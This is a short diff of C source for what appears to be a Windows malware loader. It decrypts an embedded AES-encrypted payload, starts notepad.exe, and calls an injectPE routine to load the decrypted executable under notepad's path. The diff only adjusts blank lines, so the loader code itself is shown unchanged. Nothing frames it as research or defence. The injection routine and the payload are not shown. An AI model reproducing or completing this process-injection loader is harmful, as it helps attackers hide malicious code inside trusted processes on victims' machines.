@@ -76,7 +76,7 @@ int main() {
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, AES_KEY, AES_IV);
     AES_CBC_decrypt_buffer(&ctx, encData, payload_enc_len);
-  
+
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
@@ -84,9 +84,9 @@ int main() {
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+
         injectPE(encData, "C:\\Windows\\System32\\notepad.exe");
     }
-
     free(encData);
     return 0;
 }
